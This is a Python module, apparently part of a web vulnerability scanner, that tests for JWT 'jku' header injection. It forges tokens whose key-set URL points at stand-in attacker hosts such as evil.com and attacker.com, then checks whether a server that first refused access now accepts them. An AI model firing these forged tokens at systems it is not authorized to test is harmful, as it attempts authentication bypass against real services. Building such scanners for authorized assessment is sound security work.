"""jku/x5u header injection attack."""

import logging
from typing import Any

from ._helpers import (
    JWT_AUTH_HEADERS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_jku_injection(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test jku (JWK Set URL) header injection.

    Injects a jku header pointing to an attacker-controlled URL to test
    if the server fetches and trusts external key sets.
    """
    result: dict[str, Any] = {"attack": "jku_injection", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict):
            header = {"alg": "HS256", "typ": "JWT"}

        jku_urls = [
            "https://evil.com/keys.json",
            "http://attacker.com/jwks",
            "https://raw.githubusercontent.com/attacker/keys/main/jwks.json",
        ]

        original_status = _get_original_status(url, session)

        for jku_url in jku_urls:
            jku_header = dict(header)
            jku_header["jku"] = jku_url
            jku_header["alg"] = "HS256"
            jku_token = _create_jwt(jku_header, payload)

            for auth_header in JWT_AUTH_HEADERS:
                resp = _send_with_token(url, jku_token, auth_header, session)
                status = resp.get("status", 0)

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "jku_url": jku_url,
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": "jku_injection_auth_bypass",
                        }
                    )
                    break

            if result["vulnerable"]:
                break

        logger.info("JKU injection test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("JKU injection test error on %s: %s", url, e)
    return result
